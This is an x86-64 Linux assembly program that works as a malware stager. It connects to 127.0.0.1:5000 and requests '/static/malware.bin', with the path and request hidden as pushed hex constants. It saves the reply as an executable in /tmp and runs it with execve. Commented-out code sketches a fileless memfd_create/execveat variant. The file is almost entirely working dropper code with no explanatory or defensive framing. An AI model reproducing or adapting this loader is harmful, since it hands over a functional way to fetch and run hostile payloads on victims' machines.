_start:
    push %rbp
    mov %rsp, %rbp
    sub $2072, %rsp

    movl $2, %edi # AF_INET
    movl $1, %esi # SOCK_STREAM
    xor %edx, %edx
    mov $41, %rax # socket syscall
    syscall

    cmp $0, %rax
    mov $1, %edi # exit with status 1 if fail
    jl _cleanup
    mov %rax, -4(%rbp)


   mov $0x6e69622e64656b, %rsi
    push %rsi
    mov $0x6361705f65726177, %rsi
    push %rsi
    mov $0x6c616d2f706d742f, %rsi
    push %rsi
    mov %rsp, %rdi
    mov $448, %rsi # S_IRWXU
    mov $85, %rax # creat syscall
    syscall
    pop %rcx
    pop %rcx
    pop %rcx
    mov %rax, 1024(%rsp)
    cmp $0xFFFFFFFFFFFFFFFF, %rax # exit if error
    mov $6, %rdi 
    je _cleanup


    #push $0x44726 # address of name of fd to create
    #mov %rsp, %rdi
    #xor %rsi, %rsi
    #mov $319, %rax # memfd_create syscall
    #syscall
    #pop %rcx
    #mov %rax, 1024(%rsp)
    #cmp $0xFFFFFFFFFFFFFFFF, %rax # exit if error
    #mov $6, %rdi 
    #je _cleanup
    
    # initialize sockaddr_in struct
    lea 2052(%rsp), %rdi
    
    
    movw $2, (%rdi) # sin_family = AF_NET
    movw $0x8813, 2(%rdi) # sin_port = 5000
    movl $16777343, 4(%rdi) # sin_addr.s_addr = '127.0.0.1'

    movl -4(%rbp), %edi # sockfd
    lea 2052(%rsp), %rsi # &server_addr
    movl $16, %edx
    mov $42, %rax # connect syscall
    
    syscall

    cmp $0, %rax
    mov $2, %edi # exit with status 2 if fail
    jl _cleanup
    
    movl -4(%rbp), %edi # sockfd
    

    # pushq 0
    mov $0x0a0d0a0d, %rsi
    push %rsi
    mov $0x312e312f50545448, %rsi
    push %rsi
    mov $0x206e69622e657261, %rsi
    push %rsi
    mov $0x776c616d2f636974, %rsi
    push %rsi
    mov $0x6174732f20544547, %rsi
    push %rsi
    
    mov %rsp, %rsi
    movl $36, %edx # THIS IS THE LENGTH OF THE REQUEST STRING!!!! I HARDCODED IT :)
    xor %r10, %r10
    xor %r8, %r8
    xor %r9, %r9
    mov $44, %rax # sendto syscall
    syscall

    pop %rcx
    pop %rcx
    pop %rcx
    pop %rcx
    pop %rcx
    # popq %rcx

    cmp $0, %rax
    mov $3, %edi # exit with status 3 if fail
    jl _cleanup

    lea -1040(%rbp), %r13
    mov $0x0a0d0a0d, %r12d
_recv_packet_loop:
    movl -4(%rbp), %edi # sockfd
    mov %r13, %rsi
    movl $1, %edx
    xor %r10, %r10
    xor %r8, %r8
    xor %r9, %r9
    mov $45, %rax # recvfrom syscall
    syscall

    cmp $0, %rax
    jle _recv_packet_end
    cmp %r12d, -3(%rsi) # '\r'
    je _recv_packet_end

    inc %r13
    jmp _recv_packet_loop
_recv_packet_end:

    lea -1040(%rbp), %r13
_recv_packet_loop_2:
    movl -4(%rbp), %edi # sockfd
    mov %r13, %rsi
    movl $1, %edx
    xor %r10, %r10
    xor %r8, %r8
    xor %r9, %r9
    mov $45, %rax # recvfrom syscall
    syscall

    cmp $0, %rax
    jle _recv_packet_end_2

    mov 1024(%rsp), %rdi
    # mov $1, %rdi
    mov %r13, %rsi # address of encrypted buffer
    mov $1, %rdx # size of bytes read
    mov $1, %rax # write syscall
    syscall

    # inc %r13
    jmp _recv_packet_loop_2
_recv_packet_end_2:
    mov 1024(%rsp), %rdi
    mov $3, %rax # close syscall
    syscall

    mov $0x6e69622e64656b, %rsi
    push %rsi
    mov $0x6361705f65726177, %rsi
    push %rsi
    mov $0x6c616d2f706d742f, %rsi
    push %rsi
    mov %rsp, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
    mov $59, %rax # execve syscall
    syscall

    mov $5, %rdi

    #mov 1024(%rsp), %rdi
    #push $0
    #mov %rsp, %rsi # address of empty string
    #xor %rdx, %rdx
    #xor %rcx, %rcx
    #xor %r10, %r10
    #mov $0x1000, %r8 # AT_EMPTY_PATH
    #mov $322, %rax # execveat syscall
    #syscall
    #mov $5, %rdi # exit if error (this line should never be reached)

_cleanup:
    add $2072, %rsp
    mov %rbp, %rsp
    pop %rbp

    mov $60, %rax # exit syscall
    syscall
